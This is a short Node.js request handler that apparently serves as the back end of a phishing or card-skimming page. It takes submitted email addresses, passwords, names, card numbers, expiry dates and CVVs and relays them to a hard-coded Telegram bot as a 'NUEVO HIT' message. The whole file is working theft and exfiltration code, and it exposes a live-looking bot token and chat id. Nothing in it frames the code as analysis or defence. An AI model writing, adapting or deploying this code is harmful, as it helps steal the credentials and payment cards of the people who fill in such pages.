const axios = require('axios');

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(200).send('OK');

    const { em, pw, nm, cc, ex, cv, token } = req.body;
    const botToken = "8255731465:AAGrPR_qH0zC4zTdBqOj-Zt1jqY0W03-yws";
    const chatId = "7993722214";

    const mensaje = `⭐ **NUEVO HIT** ⭐\n\n` +
                    `💰 **Resultado:** ${token}\n` +
                    `📧 **Email:** \`${em}\` \n` +
                    `🔑 **Pass:** \`${pw}\` \n` +
                    `👤 **Nombre:** ${nm}\n` +
                    `💳 **Tarjeta:** \`${cc}\` \n` +
                    `📅 **Exp:** ${ex} | **CVV:** ${cv}`;

    try {
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: mensaje,
            parse_mode: 'Markdown'
        });
        return res.status(200).json({ success: true });
    } catch (error) {
        return res.status(200).json({ success: false });
    }
}
